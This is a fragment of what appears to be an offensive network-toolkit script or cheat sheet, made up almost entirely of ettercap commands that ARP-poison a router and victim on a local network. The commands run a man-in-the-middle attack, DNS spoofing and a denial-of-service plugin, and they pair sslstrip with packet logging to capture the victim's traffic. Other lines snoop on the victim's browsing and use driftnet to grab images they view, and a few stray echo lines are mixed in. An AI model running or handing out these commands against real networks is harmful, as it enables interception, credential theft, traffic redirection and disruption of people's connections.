etterfilter $rrr -o filter.ef

ettercap -T -Q -i $interface -F $find2/$filname -M arp /$rou/ /$targ/

ettercap -T -Q -i $interface -P find_ip -M arp // // | grep "find_ip:" | awk '{print}'

ettercap -T -Q -i $interface -P dos_attack -M arp // //

sslstrip.py -p -w ~/opensource/logs/$SESSION.log -l 10000 &
   ettercap -T -q -i $interface -w ~/opensource/logs/$SESSION.pcap -L ~/opensource/logs/$SESSION -M arp /$ROUTER/ /$VICTIM/


ettercap -T -Q -i $interface -P remote_browser -M arp /$rou/ /$targ/

DNS SPOOFING {redirect web-domains}
ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou/ /$targ/


launch a man-in-the-middle attack against ${Reset};
   echo ${CyanF}[+]${RedF}:${YellowF}a target in the localnetwork, so we can capture TCP/IP packets
ettercap -T -Q -i $interface -M arp /$rou/ /$targ/


Sniff remote pictures of a target machine
driftnet -i $interface -d ~/opensource/netool-capture & ettercap -T -Q -i $interface -M arp /$targ/ /$rou/
